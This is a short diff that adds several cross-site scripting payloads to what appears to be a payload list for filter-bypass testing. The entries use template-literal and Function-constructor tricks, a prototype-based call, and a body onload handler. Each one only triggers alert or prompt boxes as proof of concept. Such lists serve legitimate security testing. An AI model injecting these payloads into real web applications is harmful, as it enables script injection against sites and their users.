@@ -251,4 +251,7 @@ javascript:confirm(7)//://svg
 Function("a=`","`,xss=1){alert(xss)")()
 a=`${alert/*}`;
 b=`*/(1)}`;
-Function("a=`","`,xss=1){alert(xss)")() 
+Function("a=`","`,xss=1){alert(xss)")()
+a{b:`function(){alert(1)}()`;}
+a=function(){},(p=>p.c=()=>alert('d'))(a.prototype),b=new a,b.c()
+<body onload=```${prompt``}`>
